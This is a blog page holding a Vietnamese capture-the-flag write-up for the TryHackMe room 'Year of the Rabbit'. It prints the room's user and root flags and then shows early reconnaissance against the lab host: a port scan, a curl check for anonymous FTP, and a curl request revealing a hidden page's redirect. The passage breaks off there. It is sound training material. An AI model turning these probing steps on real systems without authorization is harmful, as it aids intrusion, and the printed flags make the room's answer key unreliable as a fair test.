<!doctype html><html lang=en class=no-js> <head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=author content=0x5h1n0k0><link href=https://0x5h1n0k0.github.io/tryhackme/room/yearoftherabbit/ rel=canonical><link rel=icon href=../../../assets/favicon.png><meta name=generator content="mkdocs-1.5.2, mkdocs-material-8.3.9"><title>Year of the Rabbit | 0x5h1n0k0</title><link rel=stylesheet href=../../../assets/stylesheets/main.1d29e8d0.min.css><link rel=stylesheet href=../../../assets/stylesheets/cur.css><link rel=stylesheet href=../../../assets/stylesheets/footer.scss><link rel=stylesheet href=../../../assets/stylesheets/palette.cbb835fc.min.css><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link rel=stylesheet href="https://fonts.googleapis.com/css?family=Fira+Sans:300,300i,400,400i,700,700i%7CFira+Code:400,400i,700,700i&display=fallback"><style>:root{--md-text-font:"Fira Sans";--md-code-font:"Fira Code"}</style><link rel=stylesheet href=../../../stylesheets/extra.css><script>__md_scope=new URL("../../..",location),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script><script>function gtag(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],gtag("js",new Date),gtag("config","G-XXXXXXXXXX"),document.addEventListener("DOMContentLoaded",function(){document.forms.search&&document.forms.search.query.addEventListener("blur",function(){this.value&&gtag("event","search",{search_term:this.value})}),"undefined"!=typeof location$&&location$.subscribe(function(e){gtag("config","G-XXXXXXXXXX",{page_path:e.pathname})})})</script><script async src="https://www.googletagmanager.com/gtag/js?id=G-XXXXXXXXXX"></script><link rel=stylesheet href=../../../overrides/assets/stylesheets/main.82a244a8.min.css><!-- live 2d --><link href=https://r18-nmsl.cn/pio/pio.css rel=stylesheet type=text/css><!-- <link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css">
    <script src="https://fastly.jsdelivr.net/gh/stevenjoezhang/live2d-widget@latest/autoload.js"></script> --></head> <body dir=ltr data-md-color-scheme=slate data-md-color-primary=indigo data-md-color-accent=indigo> <script>var palette=__md_get("__palette");if(palette&&"object"==typeof palette.color)for(var key of Object.keys(palette.color))document.body.setAttribute("data-md-color-"+key,palette.color[key])</script> <input class=md-toggle data-md-toggle=drawer type=checkbox id=__drawer autocomplete=off> <input class=md-toggle data-md-toggle=search type=checkbox id=__search autocomplete=off> <label class=md-overlay for=__drawer></label> <div data-md-component=skip> <a href=#year-of-the-rabbit class=md-skip> Skip to content </a> </div> <div data-md-component=announce> </div> <header class=md-header data-md-component=header> <nav class="md-header__inner md-grid" aria-label=Header> <a href=../../.. title=0x5h1n0k0 class="md-header__button md-logo" aria-label=0x5h1n0k0 data-md-component=logo> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M12 3 1 9l11 6 9-4.91V17h2V9M5 13.18v4L12 21l7-3.82v-4L12 17l-7-3.82z"></path></svg> </a> <label class="md-header__button md-icon" for=__drawer> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg> </label> <div class=md-header__title data-md-component=header-title> <div class=md-header__ellipsis> <div class=md-header__topic> <span class=md-ellipsis> 0x5h1n0k0 </span> </div> <div class=md-header__topic data-md-component=header-topic> <span class=md-ellipsis> Year of the Rabbit </span> </div> </div> </div> <form class=md-header__option data-md-component=palette> <input class=md-option data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme=slate data-md-color-primary=indigo data-md-color-accent=indigo aria-label="Switch to light mode" type=radio name=__palette id=__palette_1> <label class="md-header__button md-icon" title="Switch to light mode" for=__palette_2 hidden> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M17 6H7c-3.31 0-6 2.69-6 6s2.69 6 6 6h10c3.31 0 6-2.69 6-6s-2.69-6-6-6zm0 10H7c-2.21 0-4-1.79-4-4s1.79-4 4-4h10c2.21 0 4 1.79 4 4s-1.79 4-4 4zM7 9c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg> </label> <input class=md-option data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme=default data-md-color-primary=indigo data-md-color-accent=indigo aria-label="Switch to dark mode" type=radio name=__palette id=__palette_2> <label class="md-header__button md-icon" title="Switch to dark mode" for=__palette_1 hidden> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M17 7H7a5 5 0 0 0-5 5 5 5 0 0 0 5 5h10a5 5 0 0 0 5-5 5 5 0 0 0-5-5m0 8a3 3 0 0 1-3-3 3 3 0 0 1 3-3 3 3 0 0 1 3 3 3 3 0 0 1-3 3Z"/></svg> </label> </form> <label class="md-header__button md-icon" for=__search> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg> </label> <div class=md-search data-md-component=search role=dialog> <label class=md-search__overlay for=__search></label> <div class=md-search__inner role=search> <form class=md-search__form name=search> <input type=text class=md-search__input name=query aria-label=Search placeholder=Search autocapitalize=off autocorrect=off autocomplete=off spellcheck=false data-md-component=search-query required> <label class="md-search__icon md-icon" for=__search> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg> </label> <nav class=md-search__options aria-label=Search> <a href=javascript:void(0) class="md-search__icon md-icon" aria-label=Share data-clipboard data-clipboard-text data-md-component=search-share tabindex=-1> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7 0-.24-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91 1.61 0 2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08Z"/></svg> </a> <button type=reset class="md-search__icon md-icon" aria-label=Clear tabindex=-1> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg> </button> </nav> <div class=md-search__suggest data-md-component=search-suggest></div> </form> <div class=md-search__output> <div class=md-search__scrollwrap data-md-scrollfix> <div class=md-search-result data-md-component=search-result> <div class=md-search-result__meta> Initializing search </div> <ol class=md-search-result__list></ol> </div> </div> </div> </div> </div> <div class=md-header__source> <a href=https://github.com/0x5h1n0k0/0x5h1n0k0.github.io title="Go to repository" class=md-source data-md-component=source> <div class="md-source__icon md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 448 512"><!-- Font Awesome Free 6.1.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg> </div> <div class=md-source__repository> 0x5h1n0k0/0x5h1n0k0.github.io <ul class=md-source__facts> </ul> </div> </a> </div> </nav> </header> <div class=md-container data-md-component=container> <main class=md-main data-md-component=main> <div class="md-main__inner md-grid"> <div class="md-sidebar md-sidebar--primary" data-md-component=sidebar data-md-type=navigation> <div class=md-sidebar__scrollwrap> <div class=md-sidebar__inner> <nav class="md-nav md-nav--primary" aria-label=Navigation data-md-level=0> <label class=md-nav__title for=__drawer> <a href=../../.. title=0x5h1n0k0 class="md-nav__button md-logo" aria-label=0x5h1n0k0 data-md-component=logo> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M12 3 1 9l11 6 9-4.91V17h2V9M5 13.18v4L12 21l7-3.82v-4L12 17l-7-3.82z"></path></svg> </a> 0x5h1n0k0 </label> <div class=md-nav__source> <a href=https://github.com/0x5h1n0k0/0x5h1n0k0.github.io title="Go to repository" class=md-source data-md-component=source> <div class="md-source__icon md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 448 512"><!-- Font Awesome Free 6.1.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg> </div> <div class=md-source__repository> 0x5h1n0k0/0x5h1n0k0.github.io <ul class=md-source__facts> </ul> </div> </a> </div> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--section md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_1 type=checkbox id=__nav_1> <label class=md-nav__link for=__nav_1> PINNED <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=PINNED data-md-level=1> <label class=md-nav__title for=__nav_1> <span class="md-nav__icon md-icon"></span> PINNED </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../cve/ class=md-nav__link> CVE </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_1_2 type=checkbox id=__nav_1_2> <label class=md-nav__link for=__nav_1_2> Privilege Escalation <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Privilege Escalation" data-md-level=2> <label class=md-nav__title for=__nav_1_2> <span class="md-nav__icon md-icon"></span> Privilege Escalation </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../notes/privilege-escalation/linux/ class=md-nav__link> Linux Privilege Escalation </a> </li> <li class=md-nav__item> <a href=../../../notes/privilege-escalation/windows/ class=md-nav__link> Windows Privilege Escalation </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=../../../notes/reverse-shell/ class=md-nav__link> Reverse Shell Cheatsheet </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--section md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2 type=checkbox id=__nav_2> <label class=md-nav__link for=__nav_2> Try Hack Me <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Try Hack Me" data-md-level=1> <label class=md-nav__title for=__nav_2> <span class="md-nav__icon md-icon"></span> Try Hack Me </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_1 type=checkbox id=__nav_2_1> <label class=md-nav__link for=__nav_2_1> Learning Paths <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Learning Paths" data-md-level=2> <label class=md-nav__title for=__nav_2_1> <span class="md-nav__icon md-icon"></span> Learning Paths </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_1_1 type=checkbox id=__nav_2_1_1> <label class=md-nav__link for=__nav_2_1_1> Red Teaming <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Red Teaming" data-md-level=3> <label class=md-nav__title for=__nav_2_1_1> <span class="md-nav__icon md-icon"></span> Red Teaming </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_1_1_1 type=checkbox id=__nav_2_1_1_1> <label class=md-nav__link for=__nav_2_1_1_1> Init Access <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Init Access" data-md-level=4> <label class=md-nav__title for=__nav_2_1_1_1> <span class="md-nav__icon md-icon"></span> Init Access </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../red-team-weaponization/ class=md-nav__link> Weaponization </a> </li> <li class=md-nav__item> <a href=../password-attacks/ class=md-nav__link> Password Attacks </a> </li> <li class=md-nav__item> <a href=../phishing/ class=md-nav__link> Phishing </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_1_1_2 type=checkbox id=__nav_2_1_1_2> <label class=md-nav__link for=__nav_2_1_1_2> Post Compromise <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Post Compromise" data-md-level=4> <label class=md-nav__title for=__nav_2_1_1_2> <span class="md-nav__icon md-icon"></span> Post Compromise </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../the-lay-of-the-land/ class=md-nav__link> The Lay of the Land </a> </li> <li class=md-nav__item> <a href=../enumeration/ class=md-nav__link> Enumeration </a> </li> <li class=md-nav__item> <a href=../windows-local-persistence/ class=md-nav__link> Windows Local Persistence </a> </li> </ul> </nav> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_2 type=checkbox id=__nav_2_2> <label class=md-nav__link for=__nav_2_2> Practice <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Practice data-md-level=2> <label class=md-nav__title for=__nav_2_2> <span class="md-nav__icon md-icon"></span> Practice </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../_index/easy/ class=md-nav__link> Difficulty - Easy </a> </li> <li class=md-nav__item> <a href=../_index/medium/ class=md-nav__link> Difficulty - Medium </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=../ class=md-nav__link> Room </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--section md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_3 type=checkbox id=__nav_3> <label class=md-nav__link for=__nav_3> 247CTF <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=247CTF data-md-level=1> <label class=md-nav__title for=__nav_3> <span class="md-nav__icon md-icon"></span> 247CTF </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../247ctf/ class=md-nav__link> Web </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--section md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4 type=checkbox id=__nav_4> <label class=md-nav__link for=__nav_4> DVWA <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=DVWA data-md-level=1> <label class=md-nav__title for=__nav_4> <span class="md-nav__icon md-icon"></span> DVWA </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../dvwa/ class=md-nav__link> Home </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=../../../tags/tags/ class=md-nav__link> Categories </a> </li> </ul> </nav> </div> </div> </div> <div class="md-sidebar md-sidebar--secondary" data-md-component=sidebar data-md-type=toc> <div class=md-sidebar__scrollwrap> <div class=md-sidebar__inner> <nav class="md-nav md-nav--secondary" aria-label="Table of contents"> <label class=md-nav__title for=__toc> <span class="md-nav__icon md-icon"></span> Table of contents </label> <ul class=md-nav__list data-md-component=toc data-md-scrollfix> <li class=md-nav__item> <a href=#pentest-scenario class=md-nav__link> Pentest scenario </a> <nav class=md-nav aria-label="Pentest scenario"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#reconnaissance class=md-nav__link> Reconnaissance </a> </li> <li class=md-nav__item> <a href=#init-access class=md-nav__link> Init Access </a> </li> <li class=md-nav__item> <a href=#privilege-escalation class=md-nav__link> Privilege Escalation </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#what-we-learned class=md-nav__link> What we learned </a> </li> </ul> </nav> </div> </div> </div> <div class=md-content data-md-component=content> <article class="md-content__inner md-typeset"> <aside class=mdx-author> </aside> <div class=tags-items style="color: var(--md-default-fg-color--light); padding-bottom: 10px; opacity: 0.9">Tags</div> <a href=https://github.com/0x5h1n0k0/0x5h1n0k0.github.io/edit/master/docs/tryhackme/room/yearoftherabbit/index.md title="Edit this page" class="md-content__button md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M10 20H6V4h7v5h5v3.1l2-2V8l-6-6H6c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h4v-2m10.2-7c.1 0 .3.1.4.2l1.3 1.3c.2.2.2.6 0 .8l-1 1-2.1-2.1 1-1c.1-.1.2-.2.4-.2m0 3.9L14.1 23H12v-2.1l6.1-6.1 2.1 2.1Z"/></svg> </a> <a href=https://github.com/0x5h1n0k0/0x5h1n0k0.github.io/edit/master/docs/tryhackme/room/yearoftherabbit/index.md title="View source of this page" class="md-content__button md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M17 18c.56 0 1 .44 1 1s-.44 1-1 1-1-.44-1-1 .44-1 1-1m0-3c-2.73 0-5.06 1.66-6 4 .94 2.34 3.27 4 6 4s5.06-1.66 6-4c-.94-2.34-3.27-4-6-4m0 6.5a2.5 2.5 0 0 1-2.5-2.5 2.5 2.5 0 0 1 2.5-2.5 2.5 2.5 0 0 1 2.5 2.5 2.5 2.5 0 0 1-2.5 2.5M9.27 20H6V4h7v5h5v4.07c.7.08 1.36.25 2 .49V8l-6-6H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h4.5a8.15 8.15 0 0 1-1.23-2Z"/></svg> </a> <nav class=md-tags> <a href=../../../tags/tags/#thm-room class=md-tag> THM-Room </a> <a href=../../../tags/tags/#privilege-escalation class=md-tag> Privilege Escalation </a> <a href=../../../tags/tags/#cve-2019-14287 class=md-tag> CVE-2019-14287 </a> </nav> <h1 id=year-of-the-rabbit><strong>Year of the Rabbit</strong><a class=headerlink href=#year-of-the-rabbit title="Permanent link">&para;</a></h1><p style="color:#bdbdbd"><i>Estimated time to read: 5 minutes</i></p>
 <p>Room at <a href=https://tryhackme.com/room/yearoftherabbit>https://tryhackme.com/room/yearoftherabbit</a></p> <hr> <details class=question> <summary>List of the questions solved</summary> <p>Question: What is the user flag?</p> <blockquote> <p><code>THM{1107174691af9ff3681d2b5bdb5740b1589bae53}</code></p> </blockquote> <p>Question: What is the root flag?</p> <blockquote> <p><code>THM{8d6f163a87a1c80de27a4fd61aef0f3a0ecf9161}</code></p> </blockquote> </details> <h2 id=pentest-scenario><strong>Pentest scenario</strong><a class=headerlink href=#pentest-scenario title="Permanent link">&para;</a></h2> <p>Host: 10.10.25.94</p> <h3 id=reconnaissance><strong>Reconnaissance</strong><a class=headerlink href=#reconnaissance title="Permanent link">&para;</a></h3> <p>Đầu tiên, ta sẽ scan port và directory của website.</p> <div class=highlight><span class=filename>Nmap scan NULL</span><pre><span></span><code><a id=__codelineno-0-1 name=__codelineno-0-1 href=#__codelineno-0-1></a><span class=n>PORT</span>   <span class=n>STATE</span>         <span class=n>SERVICE</span>
<a id=__codelineno-0-2 name=__codelineno-0-2 href=#__codelineno-0-2></a><span class=n>21</span><span class=p>/</span><span class=n>tcp</span> <span class=n>open</span><span class=p>|</span><span class=n>filtered</span> <span class=n>ftp</span>
<a id=__codelineno-0-3 name=__codelineno-0-3 href=#__codelineno-0-3></a><span class=n>22</span><span class=p>/</span><span class=n>tcp</span> <span class=n>open</span><span class=p>|</span><span class=n>filtered</span> <span class=n>ssh</span>
<a id=__codelineno-0-4 name=__codelineno-0-4 href=#__codelineno-0-4></a><span class=n>80</span><span class=p>/</span><span class=n>tcp</span> <span class=n>open</span><span class=p>|</span><span class=n>filtered</span> <span class=n>http</span>
</code></pre></div> <p>Từ scan port, ta thấy website có mở port 21 với service ftp. Một tip nhỏ để biết có login ẩn danh được hay không là dùng curl để xử lý.</p> <div class=highlight><span class=filename>Curl</span><pre><span></span><code><a id=__codelineno-1-1 name=__codelineno-1-1 href=#__codelineno-1-1></a><span class=err>└─</span><span class=p>$</span> <span class=nb>curl </span><span class=n>ftp</span><span class=p>://</span><span class=n>10</span><span class=p>.</span><span class=n>10</span><span class=p>.</span><span class=n>25</span><span class=p>.</span><span class=n>94</span> <span class=n>-v</span>   
<a id=__codelineno-1-2 name=__codelineno-1-2 href=#__codelineno-1-2></a><span class=p>*</span>   <span class=n>Trying</span> <span class=n>10</span><span class=p>.</span><span class=n>10</span><span class=p>.</span><span class=n>25</span><span class=p>.</span><span class=n>94</span><span class=p>:</span><span class=n>21</span><span class=p>...</span>
<a id=__codelineno-1-3 name=__codelineno-1-3 href=#__codelineno-1-3></a><span class=p>*</span> <span class=n>Connected</span> <span class=n>to</span> <span class=n>10</span><span class=p>.</span><span class=n>10</span><span class=p>.</span><span class=n>25</span><span class=p>.</span><span class=n>94</span> <span class=p>(</span><span class=n>10</span><span class=p>.</span><span class=n>10</span><span class=p>.</span><span class=n>25</span><span class=p>.</span><span class=n>94</span><span class=p>)</span> <span class=n>port</span> <span class=n>21</span> <span class=p>(</span><span class=c>#0)</span>
<a id=__codelineno-1-4 name=__codelineno-1-4 href=#__codelineno-1-4></a><span class=p>&lt;</span> <span class=n>220</span> <span class=p>(</span><span class=n>vsFTPd</span> <span class=n>3</span><span class=p>.</span><span class=n>0</span><span class=p>.</span><span class=n>2</span><span class=p>)</span>
<a id=__codelineno-1-5 name=__codelineno-1-5 href=#__codelineno-1-5></a><span class=p>&gt;</span> <span class=n>USER</span> <span class=n>anonymous</span>
<a id=__codelineno-1-6 name=__codelineno-1-6 href=#__codelineno-1-6></a><span class=p>&lt;</span> <span class=n>331</span> <span class=n>Please</span> <span class=n>specify</span> <span class=n>the</span> <span class=n>password</span><span class=p>.</span>
<a id=__codelineno-1-7 name=__codelineno-1-7 href=#__codelineno-1-7></a><span class=p>&gt;</span> <span class=n>PASS</span> <span class=n>ftp</span><span class=nv>@example</span><span class=p>.</span><span class=n>com</span>
<a id=__codelineno-1-8 name=__codelineno-1-8 href=#__codelineno-1-8></a><span class=p>&lt;</span> <span class=n>530</span> <span class=n>Login</span> <span class=n>incorrect</span><span class=p>.</span>
<a id=__codelineno-1-9 name=__codelineno-1-9 href=#__codelineno-1-9></a><span class=p>*</span> <span class=n>Access</span> <span class=n>denied</span><span class=p>:</span> <span class=n>530</span>
<a id=__codelineno-1-10 name=__codelineno-1-10 href=#__codelineno-1-10></a><span class=p>*</span> <span class=n>Closing</span> <span class=n>connection</span> <span class=n>0</span>
<a id=__codelineno-1-11 name=__codelineno-1-11 href=#__codelineno-1-11></a><span class=n>curl</span><span class=p>:</span> <span class=p>(</span><span class=n>67</span><span class=p>)</span> <span class=n>Access</span> <span class=n>denied</span><span class=p>:</span> <span class=n>530</span>
</code></pre></div> <p>Từ kết quả của curl, ta thấy không login được với user ẩn danh.</p> <p>Tiếp tục scan dir bằng gobuster, ta thấy website có trang <code>http://10.10.25.94/assets/</code>. Với file RickRolled thì chúng ta hiểu nó là gì rồi ::). Và file style.css ta thấy một hint khá hữu ích về trang web ẩn <code>../sup3r_s3cr3t_fl4g.php</code></p> <p> <figure><img src=image.png><figcaption>Style.css</figcaption> </figure> </p> <p>Vào website thì ta phát hiện nó chặn js </p> <p><img alt src=image-1.png></p> <p>Một tip nhỏ nữa, ta cũng sẽ dùng curl để xem xét gói tin, thay vì tắt js. (Bạn đọc thì nên tắt js xem website nó thể hiện gì nhen :3)</p> <div class=highlight><span class=filename>Curl</span><pre><span></span><code><a id=__codelineno-2-1 name=__codelineno-2-1 href=#__codelineno-2-1></a><span class=err>└─</span><span class=p>$</span> <span class=nb>curl </span><span class=n>http</span><span class=p>://</span><span class=n>10</span><span class=p>.</span><span class=n>10</span><span class=p>.</span><span class=n>25</span><span class=p>.</span><span class=n>94</span><span class=p>/</span><span class=n>sup3r_s3cr3t_fl4g</span><span class=p>.</span><span class=n>php</span> <span class=n>-v</span> 
<a id=__codelineno-2-2 name=__codelineno-2-2 href=#__codelineno-2-2></a><span class=p>*</span>   <span class=n>Trying</span> <span class=n>10</span><span class=p>.</span><span class=n>10</span><span class=p>.</span><span class=n>25</span><span class=p>.</span><span class=n>94</span><span class=p>:</span><span class=n>80</span><span class=p>...</span>
<a id=__codelineno-2-3 name=__codelineno-2-3 href=#__codelineno-2-3></a><span class=p>*</span> <span class=n>Connected</span> <span class=n>to</span> <span class=n>10</span><span class=p>.</span><span class=n>10</span><span class=p>.</span><span class=n>25</span><span class=p>.</span><span class=n>94</span> <span class=p>(</span><span class=n>10</span><span class=p>.</span><span class=n>10</span><span class=p>.</span><span class=n>25</span><span class=p>.</span><span class=n>94</span><span class=p>)</span> <span class=n>port</span> <span class=n>80</span> <span class=p>(</span><span class=c>#0)</span>
<a id=__codelineno-2-4 name=__codelineno-2-4 href=#__codelineno-2-4></a><span class=p>&gt;</span> <span class=n>GET</span> <span class=p>/</span><span class=n>sup3r_s3cr3t_fl4g</span><span class=p>.</span><span class=n>php</span> <span class=n>HTTP</span><span class=p>/</span><span class=n>1</span><span class=p>.</span><span class=n>1</span>
<a id=__codelineno-2-5 name=__codelineno-2-5 href=#__codelineno-2-5></a><span class=p>&gt;</span> <span class=n>Host</span><span class=p>:</span> <span class=n>10</span><span class=p>.</span><span class=n>10</span><span class=p>.</span><span class=n>25</span><span class=p>.</span><span class=n>94</span>
<a id=__codelineno-2-6 name=__codelineno-2-6 href=#__codelineno-2-6></a><span class=p>&gt;</span> <span class=n>User-Agent</span><span class=p>:</span> <span class=n>curl</span><span class=p>/</span><span class=n>7</span><span class=p>.</span><span class=n>88</span><span class=p>.</span><span class=n>1</span>
<a id=__codelineno-2-7 name=__codelineno-2-7 href=#__codelineno-2-7></a><span class=p>&gt;</span> <span class=n>Accept</span><span class=p>:</span> <span class=p>*/*</span>
<a id=__codelineno-2-8 name=__codelineno-2-8 href=#__codelineno-2-8></a><span class=p>&gt;</span> 
<a id=__codelineno-2-9 name=__codelineno-2-9 href=#__codelineno-2-9></a><span class=p>&lt;</span> <span class=n>HTTP</span><span class=p>/</span><span class=n>1</span><span class=p>.</span><span class=n>1</span> <span class=n>302</span> <span class=n>Found</span>
<a id=__codelineno-2-10 name=__codelineno-2-10 href=#__codelineno-2-10></a><span class=p>&lt;</span> <span class=n>Date</span><span class=p>:</span> <span class=n>Fri</span><span class=p>,</span> <span class=n>01</span> <span class=n>Sep</span> <span class=n>2023</span> <span class=n>16</span><span class=p>:</span><span class=n>31</span><span class=p>:</span><span class=n>02</span> <span class=n>GMT</span>
<a id=__codelineno-2-11 name=__codelineno-2-11 href=#__codelineno-2-11></a><span class=p>&lt;</span> <span class=n>Server</span><span class=p>:</span> <span class=n>Apache</span><span class=p>/</span><span class=n>2</span><span class=p>.</span><span class=n>4</span><span class=p>.</span><span class=n>10</span> <span class=p>(</span><span class=n>Debian</span><span class=p>)</span>
<a id=__codelineno-2-12 name=__codelineno-2-12 href=#__codelineno-2-12></a><span class=p>&lt;</span> <span class=n>Location</span><span class=p>:</span> <span class=n>intermediary</span><span class=p>.</span><span class=n>php</span><span class=k>?</span><span class=n>hidden_directory</span><span class=p>=/</span><span class=n>WExYY2Cv-qU</span>
<a id=__codelineno-2-13 name=__codelineno-2-13 href=#__codelineno-2-13></a><span class=p>&lt;</span> <span class=n>Content-Length</span><span class=p>:</span> <span class=n>0</span>
